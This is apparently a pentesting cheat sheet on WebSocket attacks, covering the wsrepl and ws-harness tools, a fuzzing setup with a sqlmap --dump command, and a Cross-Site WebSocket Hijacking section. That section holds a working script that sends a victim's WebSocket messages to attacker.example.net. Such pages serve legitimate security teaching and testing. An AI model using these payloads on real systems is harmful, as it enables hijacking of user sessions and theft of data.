# Web Sockets

> WebSocket is a communication protocol that provides full-duplex communication channels over a single, long-lived connection. This enables real-time, bi-directional communication between clients (typically web browsers) and servers through a persistent connection. WebSockets are commonly used for web applications that require frequent, low-latency updates, such as live chat applications, online gaming, real-time notifications, and financial trading platforms.


## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [Using wsrepl](#using-wsrepl)
    * [Using ws-harness.py](#using-ws-harness-py)
* [Cross-Site WebSocket Hijacking (CSWSH)](#cross-site-websocket-hijacking-cswsh)
* [Labs](#labs)
* [References](#references)


## Tools

* [doyensec/wsrepl](https://github.com/doyensec/wsrepl) - WebSocket REPL for pentesters
* [mfowl/ws-harness.py](https://gist.githubusercontent.com/mfowl/ae5bc17f986d4fcc2023738127b06138/raw/e8e82467ade45998d46cef355fd9b57182c3e269/ws.harness.py)


## Methodology

### Using wsrepl

`wsrepl`, a tool developed by Doyensec, aims to simplify the auditing of websocket-based apps. It offers an interactive REPL interface that is user-friendly and easy to automate. The tool was developed during an engagement with a client whose web application heavily relied on WebSockets for soft real-time communication.

wsrepl is designed to provide a balance between an interactive REPL experience and automation. It is built with Python’s TUI framework Textual, and it interoperates with curl’s arguments, making it easy to transition from the Upgrade request in Burp to wsrepl. It also provides full transparency of WebSocket opcodes as per RFC 6455 and has an automatic reconnection feature in case of disconnects.

```ps1
pip install wsrepl
wsrepl -u URL -P auth_plugin.py
```

Moreover, wsrepl simplifies the process of transitioning into WebSocket automation. Users just need to write a Python plugin. The plugin system is designed to be flexible, allowing users to define hooks that are executed at various stages of the WebSocket lifecycle (init, on_message_sent, on_message_received, ...).

```py
from wsrepl import Plugin
from wsrepl.WSMessage import WSMessage

import json
import requests

class Demo(Plugin):
    def init(self):
        token = requests.get("https://example.com/uuid").json()["uuid"]
        self.messages = [
            json.dumps({
                "auth": "session",
                "sessionId": token
            })
        ]

    async def on_message_sent(self, message: WSMessage) -> None:
        original = message.msg
        message.msg = json.dumps({
            "type": "message",
            "data": {
                "text": original
            }
        })
        message.short = original
        message.long = message.msg

    async def on_message_received(self, message: WSMessage) -> None:
        original = message.msg
        try:
            message.short = json.loads(original)["data"]["text"]
        except:
            message.short = "Error: could not parse message"

        message.long = original
```


### Using ws-harness.py

Start `ws-harness` to listen on a web-socket, and specify a message template to send to the endpoint.

```powershell
python ws-harness.py -u "ws://dvws.local:8080/authenticate-user" -m ./message.txt
```

The content of the message should contains the **[FUZZ]** keyword.

```json
{
    "auth_user":"dGVzda==",
    "auth_pass":"[FUZZ]"
}
```

Then you can use any tools against the newly created web service, working as a proxy and tampering on the fly the content of message sent thru the websocket.

```python
sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump
```


## Cross-Site WebSocket Hijacking (CSWSH)

If the WebSocket handshake is not correctly protected using a CSRF token or a
nonce, it's possible to use the authenticated WebSocket of a user on an
attacker's controlled site because the cookies are automatically sent by the
browser. This attack is called Cross-Site WebSocket Hijacking (CSWSH).

Example exploit, hosted on an attacker's server, that exfiltrates the received
data from the WebSocket to the attacker:

```html
<script>
  ws = new WebSocket('wss://vulnerable.example.com/messages');
  ws.onopen = function start(event) {
    ws.send("HELLO");
  }
  ws.onmessage = function handleReply(event) {
    fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});
  }
  ws.send("Some text sent to the server");
</script>
```

You have to adjust the code to your exact situation. E.g. if your web
application uses a `Sec-WebSocket-Protocol` header in the handshake request,
you have to add this value as a 2nd parameter to the `WebSocket` function call
in order to add this header.


## Labs

* [PortSwigger - Manipulating WebSocket messages to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities)
* [PortSwigger - Cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)
* [PortSwigger - Manipulating the WebSocket handshake to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities)
* [Root Me - Web Socket - 0 protection](https://www.root-me.org/en/Challenges/Web-Client/Web-Socket-0-protection)


## References

- [Hacking Web Sockets: All Web Pentest Tools Welcomed - Michael Fowl - March 5, 2019](https://web.archive.org/web/20190306170840/https://www.vdalabs.com/2019/03/05/hacking-web-sockets-all-web-pentest-tools-welcomed/)
- [Hacking with WebSockets - Mike Shema, Sergey Shekyan, Vaagn Toukharian - September 20, 2012](https://media.blackhat.com/bh-us-12/Briefings/Shekyan/BH_US_12_Shekyan_Toukharian_Hacking_Websocket_Slides.pdf)
- [Mini WebSocket CTF - Snowscan - January 27, 2020](https://snowscan.io/bbsctf-evilconneck/#)
- [Streamlining Websocket Pentesting with wsrepl - Andrez Konstantinov - July 18, 2023](https://blog.doyensec.com/2023/07/18/streamlining-websocket-pentesting-with-wsrepl.html)
- [WebSocket Attacks - HackTricks - July 19, 2024](https://book.hacktricks.xyz/pentesting-web/websocket-attacks)